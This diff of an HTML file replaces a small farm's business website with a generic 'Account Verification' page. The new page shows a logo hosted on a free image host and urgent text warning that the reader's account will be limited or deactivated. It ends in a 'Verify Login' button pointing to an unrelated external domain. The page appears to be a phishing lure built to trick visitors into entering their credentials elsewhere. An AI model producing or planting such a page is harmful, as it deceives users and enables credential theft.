@@ -1,221 +1,84 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Green Valley Farm - Fresh & Organic Produce</title>
-<style>
-  /* Reset & Base */
-  * {
-    box-sizing: border-box;
-    margin: 0; padding: 0;
-  }
-  body {
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    background: linear-gradient(135deg, #e0f7e9 0%, #b2d8a7 100%);
-    color: #2a3a1b;
-    line-height: 1.6;
-    min-height: 100vh;
-    display: flex;
-    flex-direction: column;
-  }
-  a {
-    color: #3b7a34;
-    text-decoration: none;
-  }
-  a:hover {
-    text-decoration: underline;
-  }
-  img {
-    max-width: 100%;
-    border-radius: 8px;
-    box-shadow: 0 3px 6px rgba(0,0,0,0.1);
-  }
-
-  /* Container */
-  .container {
-    width: 90%;
-    max-width: 960px;
-    margin: 0 auto;
-    padding-bottom: 3rem;
-    flex: 1;
-  }
-
-  /* Header */
-  header {
-    background: #3b7a35;
-    color: #e0f7e9;
-    padding: 2rem 1rem;
-    text-align: center;
-    box-shadow: 0 4px 8px rgb(32 71 19 / 0.7);
-  }
-  header h1 {
-    font-weight: 900;
-    font-size: 2.8rem;
-    letter-spacing: 2px;
-    margin-bottom: 0.3em;
-    text-shadow: 2px 2px 6px rgba(0,0,0,0.3);
-  }
-  header p {
-    font-size: 1.2rem;
-    font-style: italic;
-    letter-spacing: 1px;
-    text-shadow: 1px 1px 4px rgba(0,0,0,0.15);
-  }
-
-  /* Navigation */
-  nav {
-    background: #508644;
-    display: flex;
-    justify-content: center;
-    box-shadow: inset 0 -4px 8px rgba(0,0,0,0.15);
-  }
-  nav a {
-    color: #e8f1e3;
-    padding: 1rem 1.5rem;
-    font-weight: 600;
-    font-size: 1.1rem;
-    transition: background-color 0.3s ease;
-  }
-  nav a:hover {
-    background-color: #3b7a35;
-  }
-
-  /* Sections */
-  section {
-    background: #f9fdf7cc;
-    padding: 1.8rem 1.5rem;
-    margin: 2rem 0;
-    border-radius: 10px;
-    box-shadow: 0 2px 10px rgb(11 36 13 / 0.1);
-  }
-  section h2 {
-    font-size: 2rem;
-    border-bottom: 3px solid #3b7a35;
-    padding-bottom: 0.3rem;
-    margin-bottom: 1rem;
-    font-weight: 700;
-  }
-  section p {
-    font-size: 1.1rem;
-    margin-bottom: 1.2rem;
-    color: #3e4f21dd;
-  }
-
-  /* Products */
-  #products ul {
-    list-style: none;
-    display: flex;
-    flex-wrap: wrap;
-    gap: 1.2rem;
-    padding-left: 0;
-  }
-  #products li {
-    background: #e0f7e9;
-    border: 2px solid #3b7a35;
-    padding: 1rem 1.5rem;
-    border-radius: 12px;
-    box-shadow: 2px 4px 8px rgb(80 134 68 / 0.3);
-    font-weight: 600;
-    flex: 1 1 45%;
-    text-align: center;
-    transition: background-color 0.3s ease;
-  }
-  #products li:hover {
-    background-color: #c6e3be;
-    border-color: #508644;
-  }
-
-  /* Gallery */
-  #gallery {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-    gap: 1rem;
-  }
-
-  /* Contact */
-  #contact p {
-    font-weight: 600;
-    margin-bottom: 0.6rem;
-  }
-
-  /* Footer */
-  footer {
-    background: #3b7a35;
-    color: #dff0d8;
-    text-align: center;
-    padding: 1.3rem 1rem;
-    font-size: 0.9rem;
-    box-shadow: 0 -4px 8px rgb(27 53 12 / 0.7);
-  }
-  footer p {
-    margin: 0;
-  }
-
-  /* Responsive Typography */
-  @media (max-width: 600px) {
-    header h1 {
-      font-size: 2rem;
-    }
-    section h2 {
-      font-size: 1.6rem;
-    }
-    nav a {
-      padding: 0.8rem 1rem;
-      font-size: 1rem;
-    }
-  }
-</style>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Account Verification</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 2rem;
+            background-color: #f4f6f8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        main {
+            background: white;
+            padding: 3rem 3.5rem;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.1);
+            max-width: 520px;
+            width: 100%;
+            text-align: center;
+        }
+        header img {
+            max-width: 180px;
+            height: auto;
+            margin-bottom: 1.5rem;
+        }
+        h1 {
+            font-size: 2.75rem;
+            margin-bottom: 0.25rem;
+            font-weight: 700;
+            color: #222;
+        }
+        h2 {
+            font-size: 1.75rem;
+            margin-top: 0.25rem;
+            margin-bottom: 1.5rem;
+            color: #444;
+            font-weight: 600;
+        }
+        p {
+            font-size: 1.125rem;
+            line-height: 1.6;
+            color: #555;
+            margin-bottom: 2.5rem;
+        }
+        .btn {
+            font-size: 1.125rem;
+            padding: 0.85rem 3rem;
+            background-color: #003366; /* Dark blue */
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            transition: background-color 0.3s ease;
+            box-shadow: 0 4px 12px rgba(0, 51, 102, 0.4);
+        }
+        .btn:hover, .btn:focus {
+            background-color: #002244;
+            box-shadow: 0 6px 16px rgba(0, 34, 68, 0.6);
+            outline: none;
+        }
+    </style>
 </head>
 <body>
-<header>
-  <h1>Green Valley Farm</h1>
-  <p>Fresh & Organic Produce Direct from Our Sustainable Farm</p>
-</header>
-
-<nav>
-  <a href="#about">About</a>
-  <a href="#products">Products</a>
-  <a href="#gallery">Gallery</a>
-  <a href="#contact">Contact</a>
-</nav>
-
-<div class="container">
-  <section id="about" aria-label="About Green Valley Farm">
-    <h2>About Us</h2>
-    <p>At Green Valley Farm, we are committed to eco-friendly, sustainable farming practices. Our farm nurtures the land to grow fresh, organic fruits, vegetables, and free-range eggs. We believe in transparency, quality, and building lasting relationships with our community.</p>
-  </section>
-
-  <section id="products" aria-label="Our Farm Products">
-    <h2>Our Products</h2>
-    <ul>
-      <li>Organic Heirloom Tomatoes</li>
-      <li>Fresh Green Leaf Lettuce</li>
-      <li>Free-Range Farm Eggs</li>
-      <li>Raw Wildflower Honey</li>
-      <li>Seasonal Berries & Fruits</li>
-      <li>Handmade Farm Jams & Preserves</li>
-    </ul>
-  </section>
-
-  <section id="gallery" aria-label="Gallery of Farm Photos">
-    <h2>Gallery</h2>
-    <img src="farm1.jpg" alt="Green valley farm fields under bright blue sky" />
-    <img src="produce.jpg" alt="Basket with fresh organic vegetables" />
-    <img src="eggs.jpg" alt="Tray of free-range farm eggs" />
-  </section>
-
-  <section id="contact" aria-label="Contact Green Valley Farm">
-    <h2>Contact Us</h2>
-    <p>Email: <a href="mailto:contact@greenvalleyfarm.com">contact@greenvalleyfarm.com</a></p>
-    <p>Phone: <a href="tel:+15551234567">+1 (555) 123-4567</a></p>
-    <p>Visit us at: 123 Country Lane, Farmville</p>
-    <p>Follow us on <a href="https://www.facebook.com/greenvalleyfarm" target="_blank" rel="noopener noreferrer">Facebook</a> and <a href="https://www.instagram.com/greenvalleyfarm" target="_blank" rel="noopener noreferrer">Instagram</a></p>
-  </section>
-</div>
-
-<footer>
-  <p>© 2025 Green Valley Farm. All rights reserved.</p>
-</footer>
+    <main>
+        <header>
+            <img src="https://i.imghippo.com/files/RNA2010KhY.png" alt="Company Logo" />
+        </header>
+        <h1>Welcome Customer</h1>
+        <h2>Account Verification Notice</h2>
+        <p>
+            To keep your account active and secure, please complete the verification process promptly. Without verification, your access may be limited or your account could be deactivated. Act now to confirm your identity and ensure uninterrupted service.
+        </p>
+        <a href="https://www.example.pro" class="btn" role="button">Verify Login</a>
+    </main>
 </body>
 </html>
